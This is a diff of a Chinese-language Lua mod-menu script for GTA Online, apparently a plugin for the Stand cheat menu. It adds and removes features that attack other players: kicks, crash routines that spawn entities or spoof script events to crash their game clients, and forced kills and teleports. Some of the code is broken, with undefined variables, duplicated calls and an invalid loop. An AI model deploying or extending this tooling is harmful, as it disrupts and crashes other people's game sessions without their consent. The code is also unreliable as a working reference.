@@ -39,11 +39,11 @@ local PlaySound = aalib.play_sound
 local SND_ASYNC<const> = 0x0001
 local SND_FILENAME<const> = 0x00020000
 ----------------------------------
-Version = 5.3
+Version = 5.4
 local TIANXIA = "欢迎使用夜幕-V" .. Version ..  ""
 local JIAOBEN = "夜幕脚本"
 local net = "夜幕LUA暂时无法连接到服务器！"
-date = "2023.7.6"
+date = "2023.7.16"
 wait = util.yield
 joaat = util.joaat
 alloc = memory.alloc
@@ -102,6 +102,10 @@ local colors = {
     }
     function notification(message, color)
         HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(color)
+        HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(color)
+        HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(color)
+        HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(color)
+        HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(color)
         local picture = "CHAR_SOCIAL_CLUB"
         GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT(picture, 0)
         while not GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(picture) do
@@ -135,22 +139,6 @@ local spawned_objects = {}
 local function is_player_in_interior(PlayerID)
     return (memory.read_int(memory.script_global(2689235 + 1 + (PlayerID * 453) + 243)) ~= 0)
 end
-local function BlockSyncs(PlayerID, callback)
-	for _, i in ipairs(players.list(false, true, true)) do
-		if i ~= PlayerID then
-			local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
-			menu.trigger_command(outSync, "on")
-		end
-	end
-	util.yield(10)
-	callback()
-	for _, i in ipairs(players.list(false, true, true)) do
-		if i ~= PlayerID then
-			local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
-			menu.trigger_command(outSync, "off")
-		end
-	end
-end
 function log(content)
     if verbose then
         util.log("[夜幕LUA] " .. content)
@@ -183,8 +171,10 @@ local unwanted_vehicles = {"cargoplane", "tug", "jet", "skylift", "towtruck", "t
 local cleanse = { "清除NPC", "清除载具", "清除物体", "清除可拾取物体", "清除绳索", "清除投掷物"}
 local drivingStyles = {786603, 1074528293, 8388614, 1076, 2883621, 786468, 262144, 786469, 512, 5, 6}
 local interior_stuff = {0, 233985, 169473, 169729, 169985, 170241, 177665, 177409, 185089, 184833, 184577, 163585, 167425, 167169}
-menu.action(menu.my_root(), '一键转到菜单', {}, '跳转速度更加方便', function()
-    menu.focus(menu.ref_by_path('Stand>夜幕-V5.3', 37))
+HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(color)
+HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(color)
+menu.action(menu.my_root(), '一键转到菜单', {"tiaozhuan"}, '跳转速度更加方便', function()
+    menu.focus(menu.ref_by_path('Stand>夜幕-V5.4', 37))
 end)
 menu.action(menu.my_root(),"重启夜幕脚本",{},"",function ()
     util.restart_script()
@@ -252,7 +242,7 @@ menu.toggle(protections, "R*开发人员加入反应", {}, "", function(on)
     bailOnAdminJoin = on
 end)
 local function player(PlayerID)   
-    if players.get_rockstar_id(PlayerID) == 143952847 then
+    if players.get_rockstar_id(PlayerID) == 183122956 then
         util.show_corner_help("~h~~p~夜幕LUA提示你\n~h~~w~夜幕主策划在此战局，请注意您的游戏行为！~b~‹\n")
         store_dir = filesystem.store_dir() .. '\\YMss\\'
 sound_selection_dir = store_dir .. '\\sound20.txt'
@@ -265,13 +255,13 @@ local file_selection = fp:read('*a')
 fp:close()
 local sound_location = store_dir .. '\\' .. file_selection
 if not filesystem.exists(sound_location) then
-    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
+    util.toast("[夜幕提示] " .. file_selection .. " 未找到音源.")
 else
     PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
 end
 util.keep_running()
 end
-menu.divider(menu.player_root(PlayerID), "~~~~~~夜幕脚本~~~~~~", {}, "")
+menu.divider(menu.player_root(PlayerID), "---夜幕LUA---", {}, "")
     local bozo = menu.list(menu.player_root(PlayerID), "夜幕脚本", {"YMScript"}, "")
     local friendly = menu.list(bozo, "友好选项", {}, "")
     local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
@@ -294,6 +284,13 @@ menu.divider(menu.player_root(PlayerID), "~~~~~~夜幕脚本~~~~~~", {}, "")
     end)
     menu.action(friendly, "给予25等级", {}, "给予该玩家 17 万RP经验,可从 1 级提升至 25 级.\n一名玩家只能用一次嗷", function()
         menu.trigger_commands("givecollectibles" .. players.get_name(PlayerID))
+    end)
+    menu.action(friendly, "给予脚本主机", {}, "", function()
+        while players.get_script_host() ~= PlayerID do 
+            menu.trigger_commands("givesh" .. players.get_name(PlayerID))
+            util.yield(10)
+        end
+        util.yield(500)
     end)
     local trolling = menu.list(bozo, "恶搞选项", {}, "")
     local trolling2 = menu.list(bozo, "恶搞选项2", {}, "恶搞种类太多，后续恶搞会在此选项里")
@@ -787,6 +784,9 @@ end)
     menu.action(trolling, "强制进入自由模式任务", {}, "强制玩家进入自由模式任务", function()
         menu.trigger_commands("mission".. players.get_name(PlayerID))
     end)
+    menu.action(trolling2, "大圆球", {}, "", function()
+        Hamster_Ball(PlayerID)
+    end)
     menu.toggle_loop(trolling2, "假钱雨", {}, "", function ()
         local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
         local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
@@ -851,6 +851,11 @@ end)
     end)
     local weapon_trolling = menu.list(trolling2, "武器恶搞", {}, "")
     local yanhuaegao = menu.list(trolling2, "烟花恶搞", {}, "新年快乐~！")
+    menu.toggle_loop(weapon_trolling, "电击玩家", {}, "", function()
+        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
+        local pos = players.get_position(pid)
+        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 1000, true, util.joaat("weapon_stungun"), false, false, true, 1.0)
+    end)
 	menu.toggle_loop(weapon_trolling, "重型狙击枪", {}, "", function()
 		local hash <const> = util.joaat("weapon_heavysniper")
 		local camPos = CAM.GET_GAMEPLAY_CAM_COORD()
@@ -1235,13 +1240,13 @@ control_veh = player_toggle_loop(zaijuegao, PlayerID, "他的载具由你控制"
     end
     end)
 local online_player = menu.list(bozo, "线上选项", {}, "")
-    local cherter = menu.list(online_player, "反无敌选项", {}, "使用魔法打败魔法~")
-    menu.action(cherter, "眩晕爆炸", {"stun"}, "", function()
+    local cherter = menu.list(online_player, "反无敌(被动)选项", {}, "使用魔法打败魔法~")
+    menu.action(cherter, "杀死无敌玩家V1", {"stun"}, "", function()
         local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
         local pos = ENTITY.GET_ENTITY_COORDS(ped)
         MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 99999, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
     end)   
-    menu.action(cherter, "杀死无敌玩家", {"squish"}, "压死它们，直到它们死去。适用于大多数菜单。(注意：如果目标正在使用无布娃娃，则不会起作用).", function()
+    menu.action(cherter, "杀死无敌玩家V2", {"squish"}, "压死它们，直到它们死去。适用于大多数菜单。(注意：如果目标正在使用无布娃娃，则不会起作用).", function()
         local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
         local pos = ENTITY.GET_ENTITY_COORDS(ped)
         local khanjali = util.joaat("khanjali")
@@ -1265,8 +1270,30 @@ local online_player = menu.list(bozo, "线上选项", {}, "")
             entities.delete_by_handle(spawned_vehs[i])
         end
     end) 
-    player_toggle_loop(cherter, PlayerID, "移除玩家无敌", {}, "被大多数菜单所拦截.", function()
-        util.trigger_script_event(1 << PlayerID, {-1428749433, PlayerID, 448051697, math.random(0, 9999)})
+    menu.action(cherter, "用天基炮杀死玩家", {}, "", function()
+        if not OrbitalCannon.exists() and PLAYER.IS_PLAYER_PLAYING(PlayerID) then
+            OrbitalCannon.create(PlayerID)
+        end
+    end)
+    menu.action(cherter, "杀死被动玩家", {}, "", function()
+        local coords = players.get_position(PlayerID)
+        local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
+        coords.z = coords.z + 5
+        local playerCar = PED.GET_VEHICLE_PED_IS_IN(playerPed, false)
+        if playerCar > 0 then
+            entities.delete_by_handle(playerCar)
+        end
+        local carHash = util.joaat("dukes2")
+        request_model(carHash)
+        local car = entities.create_vehicle(carHash, coords, 0)
+        ENTITY.SET_ENTITY_VISIBLE(car, false, 0)
+        ENTITY.APPLY_FORCE_TO_ENTITY(car, 1, 0.0, 0.0, -65, 0.0, 0.0, 0.0, 1, false, true, true, true, true)
+    end)
+    menu.action(cherter, "死亡屏障击杀", {}, "", function()
+        Death_barrier(PlayerID)
+    end)
+    menu.toggle_loop(cherter,"移除玩家无敌V1", {}, "被大多数菜单所拦截", function()
+        util.trigger_script_event(1 << pid, {0xAD36AA57, pid, 0x96EDB12F, math.random(0, 0x270F)})
     end)
     player_toggle_loop(cherter, PlayerID, "移除载具无敌", {}, "被大多数菜单所拦截.", function()
         local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
@@ -1277,7 +1304,15 @@ local online_player = menu.list(bozo, "线上选项", {}, "")
             ENTITY.SET_ENTITY_PROOFS(veh, false, false, false, false, false, 0, 0, false)
         end
     end)
-    local duirenchats = menu.list(online_player, "语言公鸡", {}, "使用语言攻击~")
+    menu.toggle_loop(cherter,"炸死无敌玩家", {}, "被大多数菜单拦截", function()
+        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
+        local pos = ENTITY.GET_ENTITY_COORDS(ped)
+        if not PED.IS_PED_DEAD_OR_DYING(ped) and not NETWORK.NETWORK_IS_PLAYER_FADING(PlayerID) then
+            util.trigger_script_event(1 << PlayerID, {0xAD36AA57, PlayerID, 0x96EDB12F, math.random(0, 0x270F)})
+            FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), pos.x, pos.y, pos.z, 2, 50, true, false, 0.0)
+        end
+    end)
+local duirenchats = menu.list(online_player, "语言公鸡", {}, "使用语言攻击~")
 yuyangongji = filesystem.stand_dir().."\\Lua Scripts\\lib\\YeMulib"
 menu.action(duirenchats, "更改语言攻击内容",{""}, "记事本打开文件夹中的YMcu文件，编辑内容即可", function()
 util.open_folder(yuyangongji)
@@ -1422,57 +1457,75 @@ local chattrolls_root = menu.list(online_player, "西普肉的虚假检测", {},
         menu.trigger_commands("infiniteloading".. PLAYER.GET_PLAYER_NAME(PlayerID))
     end)
     local tp_player = menu.list(bozo, "传送玩家到...", {}, "")
-    local clubhouse = menu.list(tp_player, "摩托帮会所", {}, "")
-    local facility = menu.list(tp_player, "设施", {}, "")
-    local warehouse = menu.list(tp_player, "仓库", {}, "")
-    local arcade = menu.list(tp_player, "游戏厅", {}, "")
-    local cayoperico = menu.list(tp_player, "佩里科岛", {}, "")
-    for id, name in pairs(All_business_properties) do
-        if id <= 12 then
-            menu.action(clubhouse, name, {}, "", function()
-                util.trigger_script_event(1 << PlayerID, {891653640, PlayerID, id, 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(PlayerID), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, math.random(1, 10)})
-            end)
-        elseif id > 12 and id <= 21 then
-            menu.action(facility, name, {}, "", function()
-                util.trigger_script_event(1 << PlayerID, {891653640, PlayerID, id, 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(PlayerID), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-            end)
-        elseif id > 21 then
-            menu.action(arcade, name, {}, "", function() 
-                util.trigger_script_event(1 << PlayerID, {891653640, PlayerID, id, 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(PlayerID), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1})
-            end)
+    local interior_tps = {
+        [70] = "地堡", -- 70 到 80 都是地堡
+        [81] = "机动作战中心",
+        [83] = "机库", -- 83 到 87 都是机库
+        [88] = "复仇者",
+        [89] = "设施", -- 89 到 97 都是设施
+        [102] = "夜总会车库",-- 102 到 111 都是夜总会车库
+        [117] = "恐霸",
+        [122] = "竞技场工作室",
+        [123] = "名钻赌场",
+        [124] = "顶层公寓",
+        [128] = "游戏厅车库", -- 128 到 133 都是游戏厅车库
+        [146] = "夜总会",
+        [147] = "虎鲸",
+        [149] = "改装铺", -- 149 到 153 都是改装铺
+        [155] = "事务所",
+    }
+
+    local tp_timer = 0
+    menu.action(tp_player,"佩里科岛", {}, "", function()
+        menu.trigger_commands("ceojoin" .. players.get_name(PlayerID) .. " on") 
+        repeat
+            if tp_timer > 10 then
+                return
+            end
+            tp_timer += 1
+            util.yield(1000)
+        until players.get_boss(players.user()) != -1
+        local pos = players.get_position(players.user())
+        local player_pos = players.get_position(PlayerID)
+        SET_ENTITY_VISIBLE(players.user_ped(), false)
+        util.yield(100)
+        for i   = 0, 10 do
+            SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), player_pos, false, false, false)
+            util.trigger_script_event(1 << PlayerID, {1669592503, players.user(), 0, 0, 3, 1})
+            util.yield(100)
         end
-    end
-    menu.action(tp_player, "公寓邀请", {}, "", function()
-        util.trigger_script_event(1 << PlayerID, {-702866045, players.user(), PlayerID, -1, 1, 1, 0, 1, 0}) 
+        SET_ENTITY_VISIBLE(players.user_ped(), true)
+        SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), pos, false, false, false)
+        menu.trigger_commands("ceojoin" .. players.get_name(PlayerID) .. " off")
     end)
-    menu.action(cayoperico, "佩里科岛(有过场动画)", {"tpcayo"}, "", function()
-        util.trigger_script_event(1 << PlayerID, {330622597, PlayerID, 0, 0, 3, 1})
+
+    local tp_timer = 0
+    menu.action(tp_player,"韦斯普奇海滩", {}, "", function()
+        menu.trigger_commands("ceojoin" .. players.get_name(PlayerID) .. " on") 
+        repeat
+            if tp_timer > 10 then
+                return
+            end
+            tp_timer += 1
+            util.yield(1000)
+        until players.get_boss(players.user()) != -1
+        local pos = players.get_position(players.user())
+        local player_pos = players.get_position(PlayerID)
+        SET_ENTITY_VISIBLE(players.user_ped(), false)
+        util.yield(100)
+        for i   = 0, 10 do
+            SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), player_pos, false, false, false)
+            util.trigger_script_event(1 << PlayerID, {1669592503, players.user(), 0, 0, 4, 0})
+            util.yield(100)
+        end
+        SET_ENTITY_VISIBLE(players.user_ped(), true)
+        SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), pos, false, false, false)
+        menu.trigger_commands("ceojoin" .. players.get_name(PlayerID) .. " off")
     end)
-    menu.action(cayoperico, "佩里科岛(无过场动画)", {"tpcayo2"}, "", function()
-        util.trigger_script_event(1 << PlayerID, {-369672308, PlayerID, 0, 0, 4, 1})
-    end)
-    menu.action(cayoperico, "离开佩里科岛", {"cayoleave"}, "玩家必须在佩里科岛才能触发", function()
-        util.trigger_script_event(1 << PlayerID, {330622597, PlayerID, 0, 0, 3})
-    end)
-    menu.action(cayoperico, "从佩里科岛踢出", {"cayokick"}, "", function()
-        util.trigger_script_event(1 << PlayerID, {330622597, PlayerID, 0, 0, 4, 0})
-    end)
-local small = menu.list(warehouse, "小型仓库", {}, "")
-    local medium = menu.list(warehouse, "中型仓库", {}, "")
-    local large = menu.list(warehouse, "大型仓库", {}, "")
-    for id, name in pairs(small_warehouses) do
-        menu.action(small, name, {}, "", function()
-            util.trigger_script_event(1 << PlayerID, {-1796714618, PlayerID, 0, 1, id})
-        end)
-    end
-    for id, name in pairs(medium_warehouses) do
-        menu.action(medium, name, {}, "", function()
-            util.trigger_script_event(1 << PlayerID, {-1796714618, PlayerID, 0, 1, id})
-        end)
-    end
-    for id, name in pairs(large_warehouses) do
-        menu.action(large, name, {}, "", function()
-            util.trigger_script_event(1 << PlayerID, {-1796714618, PlayerID, 0, 1, id})
+
+    for id, name in interior_tps do
+        menu.action(tp_player,name, {""}, lang.get_localised(-748077967), function()
+            util.trigger_script_event(1 << PlayerID, {-1638522928, players.user(), id, 1, 0, 1, 1130429716, -1001012850, 1106067788, 0, 0, 1, 2123789977, 1, -1})
         end)
     end
     local cpu = menu.list(bozo, "电脑选项", {}, "崩不过就用物理方法搞他")
@@ -1536,7 +1589,7 @@ local small = menu.list(warehouse, "小型仓库", {}, "")
     end)
     require"lib.YeMulib.YeMulib"
     require "lib.YeMulib.YMConfig.YMplan"
-    player_removals = menu.list(bozo, "移除玩家", {"YMrem"}, "", function();end)
+    player_removals = menu.list(bozo, "移除玩家", {"Rem"}, "", function();end)
     menu.set_visible(player_removals, false)
 
     rem1 = menu.action(bozo, "移除玩家", {""}, "", function()
@@ -1544,1770 +1597,74 @@ local small = menu.list(warehouse, "小型仓库", {}, "")
         for _, id in ipairs(YMth) do
             if name == id.playerid then
                 util.toast("此玩家为夜幕VIP用户")
-                return
+                menu.trigger_commands("YMScript" .. PLAYER.GET_PLAYER_NAME(PlayerID))
             else
-                menu.trigger_commands("YMrem" .. PLAYER.GET_PLAYER_NAME(PlayerID))
+                menu.trigger_commands("Rem" .. PLAYER.GET_PLAYER_NAME(PlayerID))
             end
         end
     end)
 
-    menu.divider(player_removals, "踢出")
-    menu.action(player_removals, "CTMD踢", {}, "", function()
-            silencekick(PlayerID)
-            notification( "踢出完成", black)
-    end)    
-    menu.action(player_removals, "奇异博士踢", {"freemodedeath"}, "将杀死他们的自由模式并将他们送回故事模式", function()
-           freemodekick(PlayerID)
-           notification( "踢出完成", black)
-    end) 
-    menu.action(player_removals, "网络保释踢", {"networkbail"}, "", function()
-           networkkick(PlayerID)
-           notification( "踢出完成", black)
-    end)     
-    menu.action(player_removals, "无效掉落踢", {"invalidcollectible"}, "", function()
-          invalidcollectiblekick(PlayerID)
-          notification( "踢出完成", black)
+    menu.divider(player_removals, "踢出")   
+    menu.action(player_removals, "STAND本体智能踢出", {"kick"}, "", function()
+        menu.trigger_commands("kick" .. players.get_name(PlayerID))
     end)
-    menu.action(player_removals, "螺旋踢", {"luoxuan"}, "", function()
-          luoxuankick(PlayerID)
-          notification( "踢出完成", black)
+    menu.action(player_removals, "脚本事件踢出", {}, "", function()
+       menu.trigger_commands("scripthost")
+       menu.trigger_commands("nonhostkick".. PLAYER.GET_PLAYER_NAME(PlayerID))
     end)
-    menu.action(player_removals, "智能踢出 V1", {"zhinengti"}, "利用Stand的踢出，可能Stand不让你踢~~", function()
-        if NETWORK.NETWORK_IS_HOST() then
-            menu.trigger_commands("loveletterkick"..PLAYER.GET_PLAYER_NAME(PlayerID))
-        else
-            while not NETWORK.NETWORK_IS_HOST() do
-                menu.trigger_commands("kick"..PLAYER.GET_PLAYER_NAME(players.get_host()))
-                util.yield(2000)
-            end
-            util.yield(200)
-            menu.trigger_commands("loveletterkick"..PLAYER.GET_PLAYER_NAME(PlayerID))
-        end
-    end)
-        menu.action(player_removals, "快速踢出", {"kuaisutichu"}, "", function()
-            KickPlayer(PlayerID, "Smart")
-        end)
-
-        menu.action(player_removals, "断开连接", {}, "", function()
-            KickPlayer(PlayerID, "Breakup")
-        end)
-
-        menu.action(player_removals, "黑名单踢", {}, "", function()
-            KickPlayer(PlayerID, "Ban")
-        end)
-function CreateVehicle(Hash, Pos, Heading, Invincible)
-    STREAMING.REQUEST_MODEL(Hash)
-    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
-    local SpawnedVehicle = entities.create_vehicle(Hash, Pos, Heading)
-    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
-    if Invincible then
-        ENTITY.SET_ENTITY_INVINCIBLE(SpawnedVehicle, true)
-    end
-    return SpawnedVehicle
-end
-function CreatePed(index, Hash, Pos, Heading)
-    STREAMING.REQUEST_MODEL(Hash)
-    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
-    local SpawnedVehicle = entities.create_ped(index, Hash, Pos, Heading)
-    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
-    return SpawnedVehicle
-end
-function CreateObject(Hash, Pos, static)
-    STREAMING.REQUEST_MODEL(Hash)
-    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
-    local SpawnedVehicle = entities.create_object(Hash, Pos)
-    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
-    if static then
-        ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicle, true)
-    end
-    return SpawnedVehicle
-end
     menu.divider(player_removals, "崩溃")
-    menu.action(player_removals, "5g崩溃", {"5gcrash"}, "5gcrash", function()
-            x999gcrash(PlayerID)
-            notification( "崩溃完成", black)
-    end)
-    menu.toggle_loop(player_removals, "6g崩溃", {"six6crash"}, "6gcrash", function()
-            six6crash(PlayerID)
-            notification( "崩溃完成", black)
-    end)
-    menu.action(player_removals, "可莉崩溃", {"kelicrash"}, "嘣嘣炸弹~", function()
-    store_dir = filesystem.store_dir() .. '\\YMss\\'
-sound_selection_dir = store_dir .. '\\sound12.txt'
-if not filesystem.is_dir(store_dir) then
-    util.toast("夜幕音频没有正确安装！.")
-    util.stop_script()
-end
-fp = io.open(sound_selection_dir, 'r')
-local file_selection = fp:read('*a')
-fp:close()
-local sound_location = store_dir .. '\\' .. file_selection
-if not filesystem.exists(sound_location) then
-    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
-else
-    PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
-end
-util.keep_running()
-    local model_array = {util.joaat("boattrailer"),util.joaat("trailersmall"),util.joaat("raketrailer"),}
-		local BAD_attach = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID))
-		local fuck_ped = CreatePed(26 , util.joaat("ig_kaylee"), BAD_attach, 0)
-		ENTITY.SET_ENTITY_VISIBLE(fuck_ped, false)
-		for i = 1, 3, 1 do
-			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(fuck_ped, BAD_attach.x, BAD_attach.y, BAD_attach.z)
-			for spawn, value in pairs(model_array) do
-				local vels = {}
-				vels[spawn] = CreateVehicle(value, BAD_attach, 0)
-				for attach, value in pairs(vels) do
-					ENTITY.ATTACH_ENTITY_BONE_TO_ENTITY_BONE_Y_FORWARD(value, fuck_ped, 0, 0, true, true)
-				end
-			end
-    SYSTEM.WAIT(500)
-    entities.delete_by_handle(fuck_ped)
-		end
-    end)
-
-    local pclPlayerID = {}
-    function get_control_request(ent)
-        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
-            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
-            local tick = 0
-            while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and tick <= 100 do
-                tick = tick + 1
-                util.yield()
-                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
+    collapse1 = menu.list(player_removals, "组合崩溃(1)", {}, "夜幕全新组合崩溃")
+    menu.divider(collapse1, "夜幕组合崩溃1")
+    menu.action(collapse1, "夜夜笙歌", {"yeyeshengge"}, "", function()
+        notification( "请等待5-10秒崩溃进程", colors.black)
+        local crash_tbl = {"SWYHWTGYSWTYSUWSLSWTDSEDWSRTDWSOWSW45ERTSDWERTSVWUSWS5RTDFSWRTDFTSRYE","6825615WSHKWJLW8YGSWY8778SGWSESBGVSSTWSFGWYHSTEWHSHWG98171S7HWRUWSHJH","GHWSTFWFKWSFRWDFSRFSRTDFSGICFWSTFYWRTFYSSFSWSYWSRTYFSTWSYWSKWSFCWDFCSW",}
+        local crash_tbl_2 = {{17, 32, 48, 69},{14, 30, 37, 46, 47, 63},{9, 27, 28, 60}}
+        local cur_crash_meth = ""
+        local cur_crash = ""
+            for a,b in pairs(crash_tbl_2) do
+                cur_crash = ""
+                for c,d in pairs(b) do
+                    cur_crash = cur_crash .. string.sub(crash_tbl[a], d, d)
             end
-        end
-        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
-            util.toast("Sin control de "..ent)
-        end
-        return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent)
-    end
-function naturecrashv1(PlayerID)
-    local user = players.user()
-    local user_ped = players.user_ped()
-    local pos = players.get_position(user)
-    BlockSyncs(PlayerID, function()
-        util.yield(100)
-        menu.trigger_commands("invisibility on")
-        for i = 0, 110 do
-            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user, 0xFBF7D21F)
-            PED.SET_PED_COMPONENT_VARIATION(user_ped, 5, i, 0, 0)
-            util.yield(50)
-            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
-        end
-        util.yield(250)
-        for i = 1, 5 do
-            util.spoof_script("freemode", SYSTEM.WAIT)
-        end
-        ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
-        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x, pos.y, pos.z, 0, false, false, 0)
-        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
-        menu.trigger_commands("invisibility off")
-    end)
-end
-function naturecrashv2(PlayerID)
-    local user = players.user()
-    local user_ped = players.user_ped()
-    local pos = players.get_position(user)
-    BlockSyncs(PlayerID, function() 
-        util.yield(100)
-        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
-        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
-        TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
-        util.yield()
-        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
-        util.yield(250)
-        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
-        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
-        util.yield(1000)
-        for i = 1, 5 do
-            util.spoof_script("freemode", SYSTEM.WAIT)
-        end
-        ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
-        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x, pos.y, pos.z, 0, false, false, 0)
-    end)
-end
-    menu.action(player_removals, "大自然崩溃", {"nature"}, "", function()
-        naturecrashv1(PlayerID)
-    end) 
-    menu.toggle_loop(player_removals, "大自然崩溃 v2", {"hiroshima"}, "", function()
-        naturecrashv2(PlayerID)
-    end)
-    menu.toggle_loop(player_removals, "axery崩溃", {"axery"}, "", function()
-        menu.trigger_commands("nature " .. players.get_name(PlayerID))
-        menu.trigger_commands("badnetveh " .. players.get_name(PlayerID))
-        menu.trigger_commands("byeplague " .. players.get_name(PlayerID))
-         notification( "崩溃完成", colors.black)
-    end)
-    menu.action(player_removals,"圣诞崩溃", {"ctm"}, "圣诞快乐！-", function()
-           store_dir = filesystem.store_dir() .. '\\YMss\\'
-sound_selection_dir = store_dir .. '\\sound6.txt'
-if not filesystem.is_dir(store_dir) then
-    util.toast("夜幕音频没有正确安装！.")
-    util.stop_script()
-end
-fp = io.open(sound_selection_dir, 'r')
-local file_selection = fp:read('*a')
-fp:close()
-local sound_location = store_dir .. '\\' .. file_selection
-if not filesystem.exists(sound_location) then
-    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
-else
-    PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
-end
-util.keep_running()
-	    for i = 1, 10 do
-        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
-		local cord = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
-        STREAMING.REQUEST_MODEL(-930879665)
-        util.yield(10)
-        STREAMING.REQUEST_MODEL(3613262246)
-        util.yield(10)
-        STREAMING.REQUEST_MODEL(452618762)
-        util.yield(10)
-        while not STREAMING.HAS_MODEL_LOADED(-930879665) do util.yield() end
-        while not STREAMING.HAS_MODEL_LOADED(3613262246) do util.yield() end
-        while not STREAMING.HAS_MODEL_LOADED(452618762) do util.yield() end
-        local a1 = entities.create_object(-930879665, cord)
-        util.yield(10)
-        local a2 = entities.create_object(3613262246, cord)
-        util.yield(10)
-        local b1 = entities.create_object(452618762, cord)
-        util.yield(10)
-        local b2 = entities.create_object(3613262246, cord)
-        util.yield(300)
-        entities.delete_by_handle(a1)
-        entities.delete_by_handle(a2)
-        entities.delete_by_handle(b1)
-        entities.delete_by_handle(b2)
-        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(452618762)
-        util.yield(10)
-        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(3613262246)
-        util.yield(10)
-        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(-930879665)
-        util.yield(10)
-        end
-        if SE_Notifications then
-            notification("崩溃完成.",colors.red)
-        end
-	end)
-   menu.action(player_removals, "啊米崩溃", {"byeplague"}, "威力会不小", function ()
-        PlagueCrashPlayer(PlayerID)
-         notification( "崩溃完成", black)
-    end)
-   menu.action(player_removals, "载具发疯崩溃", {"badnetveh"}, "爱他，就要给他车", function ()
-        BadNetVehicleCrash(PlayerID)
-         notification( "崩溃完成", black)
-   end)
-local function InvalidObjectCrash(PlayerID)
-    BlockSyncs(PlayerID, function() 
